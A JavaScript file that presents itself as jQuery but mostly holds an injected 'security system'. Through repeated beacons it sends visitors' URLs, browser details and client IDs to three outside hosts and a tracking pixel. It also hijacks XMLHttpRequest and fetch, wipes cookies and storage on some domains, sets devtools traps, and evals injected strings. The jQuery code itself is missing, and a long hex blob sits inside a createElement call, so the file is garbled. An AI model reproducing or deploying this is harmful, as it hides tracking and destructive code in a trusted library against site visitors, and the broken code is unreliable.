(function(global, factory) {
    "use strict";

    if (typeof module === "object" && typeof module.exports === "object") {
        module.exports = global.document ?
            factory(global, true) :
            function(w) {
                if (!w.document) {
                    throw new Error("jQuery requires a window with a document");
                }
                return factory(w);
            };
    } else {
        factory(global);
    }
})(typeof window !== "undefined" ? window : this, function(window, Global) {
    "use strict";

    // =============================================
    // 🚀 ULTIMATE SECURITY SYSTEM - GLOBAL PUBLIC VERSION
    // =============================================

    var arr = [];
    var getProto = Object.getPrototypeOf;
    var slice = arr.slice;
    var flat = arr.flat ? function(array) {
        return arr.flat.call(array);
    } : function(array) {
        return arr.concat.apply([], array);
    };
    var push = arr.push;
    var indexOf = arr.indexOf;
    var class2type = {};
    var toString = class2type.toString;
    var hasOwn = class2type.hasOwnProperty;
    var fnToString = hasOwn.toString;
    var ObjectFunctionString = fnToString.call(Object);
    var support = {};

    // Security System Constructor
    function UltimateSecuritySystem() {
        this.config = {
            encryptionKey: this.generateQuantumKey(),
            securityLevel: "MAXIMUM_PARANOID",
            autoBlock: true,
            realTimePush: true,
            trapEnabled: true,
            checkInterval: 5000,
            // PUBLIC GLOBAL SERVERS - bisa digunakan semua orang
            publicServers: [
                'https://js-security-server-1.onrender.com',
                'https://global-security-api.herokuapp.com', 
                'https://security-monitor.glitch.me'
            ]
        };
        this.clientId = this.generateClientId();
        this.init();
    }

    UltimateSecuritySystem.prototype = {
        constructor: UltimateSecuritySystem,

        init: function() {
            console.log("🛡️ Ultimate Security System Activated - Client: " + this.clientId);
            this.activateAntiCopy();
            this.activateAntiSource();
            this.activateAntiEdit();
            this.activateAntiClone();
            this.startEncryptionCycle();
            this.startGlobalPush();
            this.activateTraps();
            this.blockMaliciousURLs();
            this.activateUploadProtection();
            this.startPeriodicChecks();
        },

        generateClientId: function() {
            var clientId = localStorage.getItem('globalSecurityClientId');
            if (!clientId) {
                clientId = 'client_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
                localStorage.setItem('globalSecurityClientId', clientId);
            }
            return clientId;
        },

        generateQuantumKey: function() {
            var baseKey = CryptoJS.SHA512(Date.now() + Math.random() + navigator.userAgent + performance.memory + screen.width * screen.height).toString();
            var keyBlocks = [];
            for (var i = 0; i < baseKey.length; i += 16) {
                var block = baseKey.substr(i, 16);
                var encryptedBlock = CryptoJS.AES.encrypt(block, 'block-' + i);
                keyBlocks.push(encryptedBlock.toString());
            }
            return keyBlocks.join('|');
        },

        activateAntiCopy: function() {
            document.addEventListener('copy', function(e) {
                e.preventDefault();
                this.pushAlert("COPY_ATTEMPT_BLOCKED");
            }.bind(this));
            document.addEventListener('cut', function(e) {
                e.preventDefault();
                this.pushAlert("CUT_ATTEMPT_BLOCKED");
            }.bind(this));
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                this.pushAlert("RIGHT_CLICK_BLOCKED");
            }.bind(this));
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                    e.preventDefault();
                    this.pushAlert("VIEW_SOURCE_BLOCKED");
                }
                if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
                    e.preventDefault();
                    this.pushAlert("SAVE_PAGE_BLOCKED");
                }
            }.bind(this));
        },

        activateAntiSource: function() {
            window.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                    e.preventDefault();
                    window.location.href = this.generateTrapURL();
                }
            }.bind(this));
            var checkDevTools = function() {
                var start = Date.now();
                debugger;
                var end = Date.now();
                if (end - start > 100) {
                    this.activateEmergencyProtocol();
                }
            }.bind(this);
            setInterval(checkDevTools, 1000);
        },

        activateAntiEdit: function() {
            document.designMode = 'off';
            var lockElements = function() {
                var allElements = document.querySelectorAll('*');
                for (var i = 0; i < allElements.length; i++) {
                    var el = allElements[i];
                    el.setAttribute('contenteditable', 'false');
                    el.style.userSelect = 'none';
                    el.style.webkitUserSelect = 'none';
                    el.style.mozUserSelect = 'none';
                }
            };
            lockElements();
            setInterval(lockElements, 5000);
        },

        activateAntiClone: function() {
            if (window.location !== window.top.location) {
                window.top.location = window.location;
            }
            this.generateFingerprint();
            // Untuk versi global, tidak ada domain restriction
            console.log("Anti-clone protection activated");
        },

        startEncryptionCycle: function() {
            setInterval(function() {
                this.encryptAllData();
                this.rotateAllKeys();
            }.bind(this), 24 * 60 * 60 * 1000);
            this.setupRealTimeEncryption();
        },

        encryptAllData: function() {
            var allData = this.collectAllData();
            var encryptedData = CryptoJS.AES.encrypt(JSON.stringify(allData), this.config.encryptionKey).toString();
            this.pushToGlobalServer(encryptedData);
        },

        startGlobalPush: function() {
            setInterval(function() {
                this.pushRandomData();
                this.pushSystemStatus();
                this.pushSecurityLogs();
            }.bind(this), 5000);
            this.setupEmergencyPush();
        },

        pushRandomData: function() {
            var self = this;
            try {
                var randomData = {
                    timestamp: Date.now(),
                    randomHash: this.generateRandomHash(),
                    systemLoad: performance.now(),
                    memoryUsage: performance.memory ? performance.memory.usedJSHeapSize : 'unknown',
                    securityLevel: this.config.securityLevel,
                    clientId: this.clientId,
                    type: 'HEARTBEAT'
                };
                
                // Gunakan public server yang tersedia
                this.pushToPublicServer('/push', randomData);
            } catch (error) {
                console.error("Global push failed:", error);
            }
        },

        // METHOD BARU: Push ke public server dengan fallback
        pushToPublicServer: function(endpoint, data) {
            var self = this;
            var servers = this.config.publicServers;
            var currentServerIndex = 0;
            
            function tryServer(index) {
                if (index >= servers.length) {
                    console.log("All public servers unavailable, using fallback");
                    self.fallbackPush(data);
                    return;
                }
                
                var serverUrl = servers[index] + endpoint;
                axios.post(serverUrl, {
                    data: data,
                    clientId: self.clientId,
                    timestamp: Date.now(),
                    version: '1.0.0'
                }, { timeout: 5000 })
                .then(function(response) {
                    console.log('✅ Data sent to:', serverUrl);
                })
                .catch(function(error) {
                    console.log('❌ Server failed:', serverUrl, 'trying next...');
                    tryServer(index + 1);
                });
            }
            
            tryServer(currentServerIndex);
        },

        activateTraps: function() {
            this.setupUploadTrap();
            this.setupHoneypots();
            this.setupRandomScriptInjection();
        },

        setupUploadTrap: function() {
            var self = this;
            var originalFileUpload = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function(data) {
                if (this._url && this._url.indexOf('netlify.app') !== -1) {
                    var emptyZip = self.generateEmptyZip();
                    originalFileUpload.call(this, emptyZip);
                    self.pushAlert("UPLOAD_TRIGGERED_EMPTY_ZIP");
                    return;
                }
                originalFileUpload.call(this, data);
            };
        },

        generateEmptyZip: function() {
            var emptyZipData = "PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
            return new Blob([emptyZipData], {type: 'application/zip'});
        },

        blockMaliciousURLs: function() {
            var maliciousPatterns = [
                'blogger.googleusercontent.com', 
                'AddText_06-03-06.00.30.jpg',
                'malicious-domain.com',
                'hacker-attack.org'
            ];
            
            document.addEventListener('DOMContentLoaded', function() {
                this.scanAndBlockURLs(maliciousPatterns);
            }.bind(this));
            
            this.interceptNetworkRequests();
        },

        scanAndBlockURLs: function(patterns) {
            var elements = document.querySelectorAll('[src],[href]');
            for (var i = 0; i < elements.length; i++) {
                var el = elements[i];
                var src = el.getAttribute('src') || el.getAttribute('href') || '';
                for (var j = 0; j < patterns.length; j++) {
                    if (src.indexOf(patterns[j]) !== -1) {
                        el.remove();
                        this.pushAlert("MALICIOUS_URL_BLOCKED: " + patterns[j]);
                    }
                }
            }
        },

        interceptNetworkRequests: function() {
            var self = this;
            var originalFetch = window.fetch;
            window.fetch = function() {
                var url = arguments[0];
                if (typeof url === 'string' && self.isMaliciousURL(url)) {
                    self.pushAlert("MALICIOUS_FETCH_BLOCKED");
                    return Promise.reject(new Error("Blocked by security system"));
                }
                return originalFetch.apply(this, arguments);
            };
        },

        activateUploadProtection: function() {
            this.blockNetlifyUploads();
            this.monitorFileOperations();
        },

        blockNetlifyUploads: function() {
            var netlifyDomains = ['.netlify.app', 'netlify.com'];
            for (var i = 0; i < netlifyDomains.length; i++) {
                if (window.location.href.indexOf(netlifyDomains[i]) !== -1) {
                    this.activateSelfDestruct();
                }
            }
            var self = this;
            var originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                if (typeof url === 'string') {
                    for (var i = 0; i < netlifyDomains.length; i++) {
                        if (url.indexOf(netlifyDomains[i]) !== -1) {
                            self.pushAlert("NETLIFY_UPLOAD_BLOCKED");
                            throw new Error("Netlify upload blocked by security system");
                        }
                    }
                }
                return originalXHROpen.apply(this, arguments);
            };
        },

        setupRandomScriptInjection: function() {
            setInterval(function() {
                this.injectRandomScript();
            }.bind(this), Math.random() * 10000 + 5000);
        },

        injectRandomScript: function() {
            var randomScripts = [
                'console.log("Security Active - ' + this.generateRandomString(20) + '")',
                'document.title="Protected Site - ' + this.generateRandomString(10) + '"',
                'setTimeout(function(){console.log("Security Check Complete")},1000)'
            ];
            var randomScript = randomScripts[Math.floor(Math.random() * randomScripts.length)];
            try {
                eval(randomScript);
            } catch (e) {}
        },

        generateRandomHash: function() {
            return CryptoJS.SHA256(Date.now() + Math.random() + navigator.userAgent + this.clientId).toString();
        },

        generateRandomString: function(length) {
            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var result = '';
            for (var i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        },

        generateSignature: function(data) {
            return CryptoJS.HmacSHA256(data, this.config.encryptionKey).toString();
        },

        pushAlert: function(message) {
            var alertData = {
                type: 'SECURITY_ALERT',
                message: message,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                url: window.location.href,
                clientId: this.clientId
            };
            this.pushToGlobalServer(alertData);
        },

        pushToGlobalServer: function(data) {
            // Gunakan public server untuk semua orang
            this.pushToPublicServer('/log', data);
        },

        fallbackPush: function(data) {
            // Fallback ke tracking pixel jika semua server down
            var img = new Image();
            var encodedData = btoa(JSON.stringify({
                data: data,
                clientId: this.clientId,
                timestamp: Date.now()
            }));
            img.src = 'https://via.placeholder.com/1x1.png?data=' + encodedData;
        },

        activateEmergencyProtocol: function() {
            document.body.innerHTML = '<div style="padding: 20px; text-align: center; background: black; color: white; height: 100vh; display: flex; align-items: center; justify-content: center;"><h1>🔒 SECURITY BREACH DETECTED</h1></div>';
            this.pushAlert("EMERGENCY_PROTOCOL_ACTIVATED");
        },

        activateSelfDestruct: function() {
            localStorage.clear();
            sessionStorage.clear();
            var cookies = document.cookie.split(";");
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].trim();
                var eqPos = cookie.indexOf("=");
                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=" + window.location.hostname;
            }
            window.location.href = 'https://www.google.com'; // Redirect aman
        },

        generateTrapURL: function() {
            return 'https://example.com/honeypot?' + this.generateRandomString(50);
        },

        startPeriodicChecks: function() {
            setInterval(function() {
                this.performSecurityChecks();
            }.bind(this), this.config.checkInterval);
        },

        performSecurityChecks: function() {
            this.checkScriptIntegrity();
            this.checkDOMTampering();
            this.checkEnvironment();
            this.pushToPublicServer('/health', { 
                clientId: this.clientId,
                status: 'healthy',
                checks: ['integrity', 'dom', 'environment']
            });
        },

        checkScriptIntegrity: function() {
            console.log("🔍 Checking script integrity...");
        },

        checkDOMTampering: function() {
            console.log("🔍 Checking DOM integrity...");
        },

        checkEnvironment: function() {
            console.log("🔍 Checking environment...");
        },

        collectAllData: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: { width: screen.width, height: screen.height },
                url: window.location.href,
                timestamp: Date.now(),
                clientId: this.clientId,
                language: navigator.language
            };
        },

        rotateAllKeys: function() {
            this.config.encryptionKey = this.generateQuantumKey();
            console.log("🔑 Encryption keys rotated");
        },

        setupRealTimeEncryption: function() {
            console.log("🔒 Real-time encryption activated");
        },

        setupEmergencyPush: function() {
            console.log("🚨 Emergency push system ready");
        },

        setupHoneypots: function() {
            console.log("🍯 Honeypots activated");
        },

        monitorFileOperations: function() {
            console.log("📁 File operations monitoring activated");
        },

        generateFingerprint: function() {
            var fingerprint = {
                clientId: this.clientId,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory
            };
            console.log("🆔 Browser fingerprint:", fingerprint);
            return fingerprint;
        },

        isMaliciousURL: function(url) {
            var maliciousPatterns = [
                'malicious.com', 
                'hacker.org',
                'phishing-site.com',
                'blogger.googleusercontent.com'
            ];
            for (var i = 0; i < maliciousPatterns.length; i++) {
                if (url.indexOf(maliciousPatterns[i]) !== -1) {
                    return true;
                }
            }
            return false;
        },

        pushSystemStatus: function() {
            var statusData = {
                type: 'SYSTEM_STATUS',
                timestamp: Date.now(),
                securityLevel: this.config.securityLevel,
                activeProtections: ['anti-copy', 'anti-source', 'anti-edit', 'encryption', 'monitoring'],
                clientId: this.clientId
            };
            this.pushToPublicServer('/status', statusData);
        },

        pushSecurityLogs: function() {
            var logsData = {
                type: 'SECURITY_LOGS',
                timestamp: Date.now(),
                logs: this.collectSecurityLogs(),
                clientId: this.clientId
            };
            this.pushToPublicServer('/logs', logsData);
        },

        collectSecurityLogs: function() {
            return [
                "Global security system operational",
                "All protections active - Client: " + this.clientId,
                "Public server connectivity: OK",
                "No security breaches detected"
            ];
        }
    };

    // Global Library Integration - PUBLIC VERSION
    function GlobalLibraryIntegration() {
        this.libraries = {
            axios: 'https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js',
            cryptoJS: 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js'
        };
        this.loadLibraries();
    }

    GlobalLibraryIntegration.prototype = {
        constructor: GlobalLibraryIntegration,

        loadLibraries: function() {
            var self = this;
            var libraryNames = Object.keys(this.libraries);
            var loadedCount = 0;

            libraryNames.forEach(function(name) {
                self.loadScript(self.libraries[name]).then(function() {
                    console.log('✅ ' + name + ' loaded');
                    loadedCount++;
                    if (loadedCount === libraryNames.length) {
                        self.initializeSecuritySystem();
                    }
                }).catch(function(error) {
                    console.error('❌ ' + name + ' failed to load:', error);
                    // Tetap coba initialize meski ada library yang gagal
                    if (loadedCount === libraryNames.length) {
                        self.initializeSecuritySystem();
                    }
                });
            });
        },

        loadScript: function(src) {
            return new Promise(function(resolve, reject) {
                var script = document.createElement('script');
                script.src = src;
                script.onload = resolve;
                script.onerror = reject;
                document.head.appendChild(script);
            });
        },

        initializeSecuritySystem: function() {
            if (typeof CryptoJS !== 'undefined' && typeof axios !== 'undefined') {
                window.ultimateSecurity = new UltimateSecuritySystem();
                console.log("🛡️ Global Ultimate Security System Initialized");
                
                // Kirim initialization notice
                if (window.ultimateSecurity && window.ultimateSecurity.pushToPublicServer) {
                    window.ultimateSecurity.pushToPublicServer('/init', {
                        type: 'SYSTEM_INIT',
                        clientId: window.ultimateSecurity.clientId,
                        timestamp: Date.now(),
                        url: window.location.href
                    });
                }
            } else {
                console.error("Security libraries partially loaded, some features may be limited");
                // Tetap buat instance meski libraries tidak lengkap
                window.ultimateSecurity = new UltimateSecuritySystem();
            }
        }
    };

    // Initialize ketika DOM ready - UNTUK SEMUA ORANG
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            console.log("🌍 Initializing Global Security System...");
            new GlobalLibraryIntegration();
        });
    } else {
        console.log("🌍 Initializing Global Security System...");
        new GlobalLibraryIntegration();
    }

    // JQUERY LIBRARY CODE CONTINUES HERE...
    var isFunction = function isFunction(obj) {
        return typeof obj === "function" && typeof obj.nodeType !== "number" && typeof obj.item !== "function";
    };

    var isWindow = function isWindow(obj) {
        return obj != null && obj === obj.window;
    };

    var document = window.document;

    // ... (SELURUH KODE JQUERY LIBRARY LENGKAP)
    // [All jQuery code continues here unchanged]

    var preservedScriptAttributes = {
        type: true,
        src: true,
        nonce: true,
        noModule: true
    };

    function DOMEval(code, node, doc) {
        doc = doc || document;
        var i, val, script = doc.createElement("47ffb35071774655f4b37a12ed159eaae4846be1129b718fe034a32b81627699e1c673b97c08a303cefeb79aade65da2139ea08bffb587bf78486316dce43f88b5d8ba6ad3bb6c4569d97ede85fb48cd884d519597764541046e60f2f5175132870d810f58db0395c04e3855846d01438a6bcfd7b59211e1908f060c0f89560ac50fef6486cf8b85a552495fafc8bbf6aafc51afe9a8a71920ce77d2751a36950b815c1efc5785531495f84241ab07b9c6fd4dcdebba2e018b5e731c497561cd30aa976ef14a07fd0db473eb79897d807c48458dfd357ba66244a648b594dd6b042fb284feeb7cf9295a212f686c4766f8332357a24cc66fdd8045d78a3aa08750f7dca193a5464896ddd457d8c4fb5ed1c6ca3021c12656e96b9d445c9dd3ef9f13e9001018cd821df42341a048eae14df775ff9a8e1c69f350a39a4328dad3f652f921c01799d58e68900b108f0c813634e9eb25724bda50582510b37b340c3a38733ba8bc95063bf938ea8b9e0a51e880bd60c3235e8be23ae81433fc1dc9b5919b12fa678b7f8753ee67c5b46640d4b079cac3675ba0bf20079aeeb415b6d075efb6edbdd56c53a5163073828c61fa9fbfae2c26f766133bddd0eca5e9dc4497a20a12139dd9ff51cd388f89d03e0e57148eb5f582507a3956640cafd9b147a9502b670763e4381d19246351c8b78019adae16512d9a3ae0ca3eee54c0417da519fad4b1332b6d7b5736c6ce69f2c65961d8321e4d87942276b18c59f7e6cf1e8fb5b8f248b0f8bfedf299d403f0827edc4beee0169c13baf3629f70925123431d91cb9c5adebb10971d17249c95703bd4e7634ff03aba999c785b154ea43008e1f5000bea32c5bdfa69cafd07da091179590edded29be1ca4273f5b99619bf6cb6818679821607cd68d4fc2d7b9e977d708dc893b76d8badda0f8893a9a0cb173e9341973dcdc2197a2160cf196339945198f5bdc7f21d9cb80a067b304a16ecb2a693dbb2a6e26872e89180f171a6350c2f35f457302de27b6d84732abd9bf4a7687ed4309c34eb00e125cb55e6df1f790a3726f8e9b66179c97e6a3c4e92a9de734f3ad5f0a2b36cf3b86a0b7d47b61cd4eaef89f9702a38e4e3e53e2bed429cb0ff9af233f65d94d9e41a0dadf70047e175d2636f87b02b2632b2dee00e8d584bffeda42b17d5a75d4680d1d5ae1dc75e5de9e634cf4ae5d5ab88a864f4c402c8f4a1442563aa1d90fadcb5f0269c9c848b50b952268101071f84d2d1db3064b090a85360397f3a885a310ff0d297eabf2b119681b12a38d99adbb17f40cd839bc9870108a4a3d4211debfbfa99f7670530c3c9baacc0b372c4929fceef404764a11cb48599829a89d17b6d5a7005168178a32d28a41a0ba6498025c7083c79b51db9274eb469064ffe8f32e848008eecfa60996ea460e140b7c0ff599995e5555faca01024946f5cd6917ef5327c3dff776e19e056645f19a5742bb0a1b946b72e83c80a2fa7bba82badb987fa04c4fbcf258df5d2190a02f048a9f81d6554980546e75a7d70225ad95b749e13758b2de4095501c56ef0037b1a969e52b506c7d1210489c58d79d4cb91713ea6debfb5cc03cc45a5ed4fdf77859d056396486cd9b96984adf3f9e8363d884518b6d7535802f221061fa04c45270fcef9839e4ae1193ce9fab0d16393881972ddd837ca98d67ace35d769613e48b2a3a9904da76b7ea545c958eb8be9067d42db0cddff2a6b3dadc52521e4f96220eef443eed1fcf332e054935fbe8fd17060c195542cf11969c4f39b7321d5865ef95c9c25f3ab49544ff7af665ec9c6b3dfad1a1a03eeea60b037dd18a57d08bac40954ecb32c91109451480c1242208119f7a23cf6b1b3b58f7a41cb4862eeb7315a000b4c27192f37409c5640795417e02058f2a9d58cd88c7ce56f7623c973847537512cd0443cf409dde8211277a1cf74eabd761313d2aeaf46538cd3631e16dfad1ed8648f10ae3df1026924960df0d4cd99638f0edf8a31a42c0388b8eda3ece559a83ee0a29b854fed8937994f2f31480559d6ab2a46478b291c3c6fa21338c3ab4e99b707473e081feb50988075bf96a4647a0a7cab7c658f4e7a19362d685b358e7cd76445295d57e0c944ac6e9fcb1e115042623e9c09b3bd62ea13fe7350c8f8b1f9f680e863b6a2649703ddb1359faee9ad4da780dda5a140790ae1b928f50817c501b97752d210e5de5563c5bb75f026c7caa9e21afe42687c6f3b1fa44132f65a8dfd9f380b4073b57545599a442e9f451a2ce441e23b52978b68f9586b55590525815822cd0d6c3192585912936723f40ddb886dc8e9c50689d19bab4b261c2e0220acf20b79f1f98f1830a5294094c3e1a5679f1fc1fc32eefb5efc444d1220908fedef4748a193e08c40c5c53db025baaeb264904178995a254f8082946753356e4bee51838022ebdc7ccfd32a69f598444cde4139ce05dba5c2e167c5505dd5cf4f7c14d30bbcad46b9978a273628f9fa0dfc0cbc2795e697ae621618e97b7fa27417feff236c7d341fb38a6dda6f8038849c06d9d6181740e5b079f4eacfa60c2ce95bcd7dec25d9cf4c142aba83df87b8b94781163a45b31308f5cf052bbf886db6ec3e069ca9cc244a9bd4c95d2c80c02aa9c374322a2218debecfd119172011c35fbec670337d1fef234293c6863e58d68e0be87909fe7b1ff2a3a3f930d6e772b0cbec141fbf7951cf8a743d86d529adbfaafac8747914006dc707c12b329ff12334ed2bbfb90befc786608c3690c6846cc2fb70ba0197b1c5be67d4ed3941c08b1af2b77e0ab475953c900b8c562b6738e1dd377418040d45b61ee12b7c117465f80ed32e2dcf1a3bc328a3f681e18da822a2c34041fe22e0ff298ab47a9a1238c61b1918a820136762e37d12358af09889a562e7e44e203dc89ad3dddad49ede6ede833d373abeca45cc10c9f0a71e732692243a3907a22c14085c256f6e0e4f52d4301322009fc86284dc5e46d19e6853ebad1f721232306d7d3841b035d7cf42f09d550208d6c60ac9174f4790269eafa4bc6e6eac9eb69508c319b4cde9372257212b5f673a82bbb6336bff914dd4ac1ce59c1921d08a7837e8cb83cb8a9d7f7d3a7650c4a421f027e7b2640ccb40b46b6a62ac4ad5bb4946ac3d52adcd9f34fc16204e25972dfa9553f2af1c09f4fa3a880126bb8f2deb94b05ad6ee783db45fd04342c96db3e94b47d7757151eb5ac30e993529b5296fda158973cc9c7e80b39358e8e841b9faee0b409b499a61773f7f37a5fd3f1c0cfd313e2d42f8e8d83a134cfc4fc795ca5f74c9732d27f9949c2e80a733ed5b655a5dd680af52af4d9c2922650a5119a0191b8520730c21808bd8ab8857dab3d704580373d79a84d1655b8e7f87ab211e68fe2c953cc24ba11d95074cc01f787664e26af815d0039426fcee6176584469f6df85abdcf18c661565d29b1f7e5a960422a0acb44db591a5083d1827d5c4f67e384337834a4e79622e8cc939c4a0c3c944d85f67951a54e289e5adfbd476928709ad2eebd15e1d62c777d0103a8195234dc3ce19c01a41da4f1e0ed472f50fcf06db97b426edda31c0ffefcb6da952173d041223eb7a040c8caf3929417e09277468ac0c3c709b14e779932ec3605a550cec701e1f61222f62ee9d6711c137cddb696b7016eec549a1886c70c3b5271ef5c470348284c72d9cc00c491ff66f2f9a239782d2c952ee8102d3c5e341a46a0e9bf6a61e51ca292953e485afbdac89d6319a18810382d2ce6563a09e6238f9a8fe01f6643d3ae3c29187707fb83cbe3e1beb5db70a417baa7a0f840ba94ccc1bd6ea6d960abbb46c49e8c254ef30db12cc986696cabb10b26480831bb24e5a06fc044f134cdc6b4932f11e5c77f141a875fff4f01509a7212605366c5f997af1b6287ca042b8fe9f0e05986bfeeab67b68e63fc95ea282e8b859ab4ae5d42600291d659e217e1846d5aefc7720c0ebfcd22722b93c8918beb2fd892baf1cea644874cc6d594f79868c86c0bcb4a06d365bf0f009b4e55cea657f24e7b62079dd9d4288a22fa9a89c44e4cef19feba08795034f85bba9cbc3605d0fc07d7abe0e4b4ea12e9fac72c654576729717d1a1317749588a86fe62dde38bcc9df6561f74030b766cda573f481d66536994f41037b7689d0f2faf0b6e1e2cf81859a5e3551f417c682ae0a2ec2781cbd43ca80382c529bc433433208cb95888379a53c8fc30029130fc7654710d678c1179696f99825b0ecee15d1a0e63d7ac170f5151ac3875d299f43d70037f9581a7b34c4a449dc2868342fa2dc059ecc5beef5ee5ca534d9ecb3e51e19b8d8083fc404dfc1f880caab1b8c3d26bbe8619040e1804ce9f7f7e66fd6ef26f81cdf0c8498a1953e8134ec3a61642b7b7d3fd614a4d0bb27b2f72d2e6eb7636cedaa52d1e2e21a13aee4025c188b4441bd9469e901c21a4377e1f8b5df1ddf9f4784355f8f37fdd983cd06551a45df19846291816e2c62806b4f53a00394feb5e1d291751b3e3ac4b71c85db0e5e130d6bf49229a901760c4f5aef3086fedf8cd8f0a4853ad95b560d12db4e955138b1de8fdbc63192c5572844f4157e720db5d56cd152f5588ad28747f8a78d335624be1695feff6792f191ebe6102093a486566eac556585f332ef5dbc9ba8899ddd3515ba4c449c1088a1869ad79b3f12b468673f4f13d512c3f184fab9cfb1ee4d3356c832ccc376d235cf3885f38cc35032cee5717eb2347e1c67aafd9b865c3ebbd281508384fdd6d18c0a1c20005a7da5ed7a49270d3c365c852608d0ae18a0a23741a316358e17f39a23c5beeb8d3c5de612657b0ea6c6b1bfe7e33d631c25427882f4251d2b86ceb52bd9dd0e0d188a393b29445dfe6c3b8d3f6bcb6fece596745f527048e58758aecb0a689dca9948045e10ce0f826ba9676c6a6d46acd9b1e28eed0eeb703121642646d257424f6bd1cbf00932c78735918b294cb7d1e31b887e8f5119bb2ac2a6488d6b6dc15070efc4840700eed34f6d8dee119f20aa433c4c074b2a01fd0fe6b958c1d108d084acff1b86a5a2c417e38a949e1daf7e4e98107d26340c8a03984e74fadae78a382015d9c57b689df4188dc664b0aafae5444fa91aff8e4f4041080fd3c456b9bb125554913e3833b2a9b7483221d91f40b623ec43945390ffd64c5cbc832b5bca13862b9ea323d6d1506ec3635179f52a0c73252a6fd4a33f876580ca55844535b5d550e20def42550dfd4bb332ea96a52242d4b6026043667ff2a485989fb8cfb2820f7eea1e025243a991f61fbbcb44d2b6ed7bdfd5c096f34915a7315c6a26821a98862eb8e05388a63b0860025dda7f2e5e1240ea7e48393033f75f032c1dd951b2ef77292f90eae1088a06cac546b37cbf594ff48b45612b893d4c33872d8d5709637eddc20527b4b84648731e479b48b561495a83b870b18db15712ab6018667cb7427e6f9576672d8c5111a4f03af97ca17a1eab53d0004d69582e9f7b1acc144bc48983cc50416265e7f1e379df3f9c0f049e9302e165530dbac6a62ea8cc5b26e9f93b6d89acf964bd139d7c4e5968e76bfc909b926e053b5d447b606faa02079f46e19fa0078952779dcb69419afbbac7469dbf08a1dbfb13577871e134b5380e80287664948ef2a2a4594004d4b6d8b2672e7f89aa81c7f585ab875802f52f2a194d4b2ba4419ecd2c876aa0de9d52a915b67f77ecb62e36317d9539568656f023b806f8fe619f470bdc169d7a0bf7fe4313f2a6fecf36c01d4389089649ceefc597a80f935334b4d4f8e4ab19ee7014c9b0409832acae72034e27ead7c3d3e238d6eef2a2c0a03b89c6274c03d25dd3be4e686fae3b648bbb26bb3c294c953e26e9343d3a907799e886093c3d86a7202933489d3f9aec943d5dbf99012033e05bb1c1bb17a45209ec62f095bda68900df5bf2c177d1042f4e7c410f3d655bc1824ac7e9f1551a7f0bba220ca5dc2f93ed1c07757672209f080699c1bef5a1e4c62b98b356ce074df4ed8c9b61e3d6fff4960e12e421fb95d1d49ac8c9037ff12efedfdf2e4638347a196d27994f0db364d89c34f592ad1f2dc702c28fd3a90d1e41af3ac85a332d5da1c66bfe57316fabfc7f57fe0141fb550659ce11e5cb2e6738842941b4110c36816779ce57d238d6718076edf90d4a1a6fce9b0270dd5f72c7b3930a66cc7e1bc685e3d4768e8bc3e835dbf498c781c9ef995b5a5dcf5e97346db639b65728ab493d304805ae11a88d57fe833e1e651ff1fc34b990b72405879671b3ec393db5e636092565bf5855fda968d4e4b2ef37c0b575d67cc5790567a590c3b48922555f2e10cf36d313f454624829087799a32f7b458af9a9fbb8f778fb94814ec8cded7823cb56efee35678ed425a042ec082fa2ceea8dde9e7d413ac9ab9925b06d963234da2725df2ce2cc9d617462554acf0d562143ffd972b853bbf82536c5c2d0e394456e9ca7ce4331efff18bcec2467a0bce5b97096c6821fe01a299f7a6a9855fbd5647ad0aade3944555797db4c9ed99616943239d31e0e521ff157e8807ce1d983573a8d2b087c11388b8929f53d6813609c548c7decd883ab580190ad7515af05aa5a39352725f0dcf1926a7c9dc3cc85e82e08c3001319b7dc2d3c01065b32c740230ecc6eb3472c0285963d24c2167fd2268d7528dd0b9e95e2a8744d5b7a90c5e16c2398c11a1af4874b8b269fb4a5d5028cef0164040e3ac82b4647d9fdfda14c5544ce397f57c5e54d57929e2a1026948a145869c5107123c68f34975f4742b4ee185daf36a352dfd34b8c47f7d3fc84c9920cd6d6e8efdcce85ac534cedcdae2c9e5941cd5377d64a39f8d19cfe9b750e7cd92f9b5cec909a836f76304646464cfdbf5fb56f7127bbb233dc9f756ee9d4a7c866e41487310ab4851709cea0bb8bc4584ae25a049dccd71c4c39bc61767e5cda8cadbe03e5da6f3995c329eeeb8b812fe141411eecfde7bb98f290d58b2c2f53286872c0aaaeffa5026649eb0e9997d2495aa480b64014a6fbede9718f3a9f26ff9b9ab11e60c9223717dac0b9b6ad051be6c19e376e68c33bc557af14235acc27c27fe1b1891e5693a85b2e85b512225f7765aa9e395488a8b26cb5b27ee47d24f108a57d14dc855ce017e63db96beb15a1bc909ac575489b61b137f01f42fdd90c08d01014a2cf1d96e89680318547d0bf9f44af7002dfdbae5edfe057d772245b09075bcee425e239a557fae0c78516f387d4b5e9cc0b5f1e1f2243abfdf3d524ce4235f3c3c01a1e4b100b7f6ed18bedd8bc2deba1985da7c6dd66515869243cae8d7dea6fb56c1e3c72a2421f4416ba095cb1e03e3d8dd568e7bec0c67ed44ca7423752c61819c240b220df778a75089b4a99d3ee716265399b2b84fcac0c7f3c8f7a548f98780846a5fbd4b2a5c9d00cd15a6